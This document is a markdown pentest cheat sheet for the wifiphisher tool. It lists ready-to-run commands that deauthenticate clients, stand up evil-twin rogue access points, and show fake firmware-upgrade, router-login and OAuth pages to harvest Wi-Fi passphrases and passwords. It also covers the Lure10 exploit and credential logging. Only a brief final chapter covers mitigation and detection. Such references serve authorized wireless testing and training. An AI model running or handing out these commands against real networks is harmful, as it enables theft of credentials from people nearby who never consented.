---
title: wifiphisher
category: credential_access
subcategory: wifi_credential
phase: 08
mitre_attack: TA0006
tags:
  - wireless
  - phishing
  - social_engineering
  - rogue_ap
  - evil_twin
difficulty: intermediate
os: linux
install: sudo apt install wifiphisher
github: https://github.com/sophron/wifiphisher
related:
  - airgeddon
  - hostapd
  - dnsmasq
---

# wifiphisher

## Chapter 1: Overview

**wifiphisher** is a security tool that mounts automated phishing attacks against WiFi networks to obtain credentials. It creates rogue access points and presents phishing pages to capture WPA passphrases, captive portal credentials, or other sensitive information.

### Key Features

- **Automated phishing**: One-command credential harvesting
- **Multiple templates**: Firmware upgrade, router login, free WiFi
- **Deauth integration**: Forces clients to rogue AP
- **Credential capture**: Harvests passwords automatically
- **WPA verification**: Validates captured passphrases

### Attack Flow

```
1. Deauth clients from real AP
2. Create rogue AP with same SSID
3. Present phishing page
4. Harvest credentials
5. Verify WPA passphrase
```

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install wifiphisher
```

**Install size**: 7.89 MB

**Dependencies**: hostapd, dnsmasq, python3-scapy

### Verify Installation

```bash
wifiphisher --help
```

---

## Chapter 3: Basic Usage

### Quick Start

```bash
sudo wifiphisher
```

### Specify Interface

```bash
sudo wifiphisher -i wlan0
```

### Set Rogue AP Name

```bash
sudo wifiphisher -e "Free WiFi"
```

### Select Template

```bash
sudo wifiphisher -p firmware-upgrade
```

---

## Chapter 4: Attack Templates

### Firmware Upgrade

```bash
sudo wifiphisher -p firmware-upgrade
```
Presents fake firmware upgrade page requiring WPA passphrase.

### Router Login

```bash
sudo wifiphisher -p network-manager
```
Mimics router login page for credential capture.

### Free WiFi

```bash
sudo wifiphisher -p oauth_login
```
Captive portal requiring email/password.

### Custom Template

```bash
sudo wifiphisher -p /path/to/custom/template/
```

---

## Chapter 5: Configuration Options

### Disable Jamming

```bash
sudo wifiphisher -nJ -e "Free WiFi"
```

### Skip Deauth Phase

```bash
sudo wifiphisher -nD -p firmware-upgrade
```

### Custom Channels

```bash
sudo wifiphisher --deauth-channels 1,3,7
```

### MAC Spoofing

```bash
sudo wifiphisher -iAM AA:BB:CC:DD:EE:FF
```

### WPA-Protected Rogue AP

```bash
sudo wifiphisher -pK s3cr3tp4ssw0rd
```

---

## Chapter 6: Advanced Features

### Handshake Capture

```bash
sudo wifiphisher -hC capture.pcap
```

### Lure10 Attack

```bash
# Capture location
sudo wifiphisher --lure10-capture

# Exploit Windows Location Service
sudo wifiphisher --lure10-exploit location.db
```

### Known Beacons

```bash
sudo wifiphisher --known-beacons
```

### Credential Logging

```bash
sudo wifiphisher --logging -lP /var/log/wifiphisher.log
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: Quick Credential Harvest

```bash
sudo wifiphisher -e "Free WiFi" -p oauth_login -nJ
```

### Scenario 2: WPA Assessment

```bash
sudo wifiphisher -p firmware-upgrade -qS
# Captures one password and exits
```

### Scenario 3: Corporate Assessment

```bash
sudo wifiphisher -i wlan0 -e "Corporate WiFi" -p network-manager --logging
```

---

## Chapter 8: Mitigation & Defense

**For network administrators:**

- **Client education**: Never enter passwords on unfamiliar pages
- **Use WPA3-SAE**: Stronger authentication
- **Monitor for rogue APs**: Detect duplicates
- **Certificate pinning**: Prevent MITM
- **Network segmentation**: Limit exposure
- **Wireless IDS**: Detect phishing APs
- **Employee training**: Security awareness

### Detection Indicators

- Duplicate SSIDs
- Rogue DHCP servers
- Unexpected certificate warnings
- Multiple APs with same BSSID
- Unusual traffic patterns

---

## Resources

- [wifiphisher GitHub](https://github.com/sophron/wifiphisher)
- [Official Documentation](https://wifiphisher.readthedocs.io/)
- [WiFi Security](https://www.wi-fi.org/discover-wi-fi/security)
- [OffSec PEN-210 Course](https://www.offsec.com/courses/pen-210/)

---

*Generated for educational purposes in authorized security testing environments only.*
